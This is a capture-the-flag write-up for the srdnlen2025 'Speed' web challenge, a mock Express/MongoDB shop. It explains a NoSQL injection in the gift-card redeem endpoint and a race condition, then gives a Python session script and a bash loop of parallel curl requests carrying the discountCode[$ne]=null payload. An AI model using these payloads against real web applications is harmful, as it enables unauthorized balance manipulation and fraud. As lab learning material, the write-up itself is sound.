---
title: Srdnlen2025 | Speed
published: 2025-03-11
description: Welcome to Radiator Springs' finest store, where every car enthusiast's dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow!
image: ''
tags: ["web"]
authors: ["akiidjk"]
solves: -1
points: -1
firstblood: false
category: Srdnlen2025
draft: false

---

## Introduction

For the second web challenge of srdnlen2025 we have a very interesting but not particularly complicated challenge.

The challenge is presented as a simple shop, so the goal is to buy the flag, which has a very high price. and we don't have enough money to buy the flag, which is particularly standard.

So we jump straight into the code and try to understand how it works.

## Source

The application is a simple javascript application using express.js and express-handlebars for page rendering and a nosql database to manage the data (MongoDB with mongoose).

![screen](/images/speed/img1.png)

As soon as we log in, we notice that the only way to get money is with these codes, which are randomly generated once in the code and cannot be reused.

```javascript
// filename: app.js
// Generate a random discount code
  const generateDiscountCode = () => {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let discountCode = '';
      for (let i = 0; i < 12; i++) {
          discountCode += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return discountCode;
  };

    const createDiscountCodes = async () => {
        const discountCodes = [
            { discountCode: generateDiscountCode(), value: 20 }
        ];

        for (const code of discountCodes) {
            const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode });
            if (!existingCode) {
                await DiscountCodes.create(code);
                console.log(`Inserted discount code: ${code.discountCode}`);
            } else {
                console.log(`Discount code ${code.discountCode} already exists.`);
            }
        }
    };

    // Call function to insert discount codes
    await createDiscountCodes();
```

As you can see, everything is normal, nothing strange, something strange we have in the routes.js in the redeem endpoint.

```javascript

let delay = 1.5;

router.get('/redeem', isAuth, async (req, res) => {
    try {
        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;

        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }

        // Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                              lastRedemption.getMonth() === today.getMonth() &&
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();

        return res.json({
            success: true,
            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message
        });

    } catch (error) {
        console.error('Error during gift card redemption:', error);
        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});
    }
});
````
The first thing that stands out is

```javascript

        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;

        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }
```

Where we can clearly see a very undisguised nosql injection where we just have to do `discountCode = { $ne: null }` to redeem the code without knowing the exact value.

But this only solves one of our problems, because when we check the code later we see that our code can only be used once, the code only gives 20 credits and we need 50 credits for the flag.

This is where the name of the challenge comes in, which gives a nice clue as to what to do next, **speed** == **race condition**.

## Solution

In my case, I split the attack into two parts because I had problems doing the race condition in python, so I used curl and bash, but there may be a more elegant way to exploit the race condition.

```python
# filename: exploit.py

import random
import string
import threading
import requests

# BASE_URL = "http://speed.challs.srdnlen.it:8082"
BASE_URL = "http://localhost:80"
s = requests.Session()

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def redeem_code():
    try:
        r = s.get(BASE_URL + "/redeem?discountCode[$ne]=null")
        print(f"Response ({threading.current_thread().name}): {r.status_code} - {r.text}")
    except Exception as e:
        print(f"Error in thread {threading.current_thread().name}: {e}")

def login(username, password):
    s.post(BASE_URL + "/user-login", json={"username": username, "password": password})
    # print(f"Login response: {r.text}")
    return username, password

def register(username, password):
    s.post(BASE_URL + "/register-user", json={"username": username, "password": password})
    # print(f"Register response: {r.text}")
    return username, password

def main():
    username = string_generator(8)
    password = string_generator(8)
    register(username, password)
    login(username, password)

    print(s.cookies["jwt"].strip())
    # redeem_code()


if __name__ == "__main__":
    main()

```

```bash
#!/bin/bash

JWT="$(python3 exploit.py)"      # Read the jwt printed by exploit.py
echo "JWT used: $JWT"

for i in {1..30}; do
  curl -s 'http://localhost:80/redeem?discountCode%5B%24ne%5D=null' \
       -H "Cookie: jwt=${JWT}" &
done

wait

```

Once you have made a few attempts and the logs show that you have 60 credits, you can copy the jwt and use it to log in.
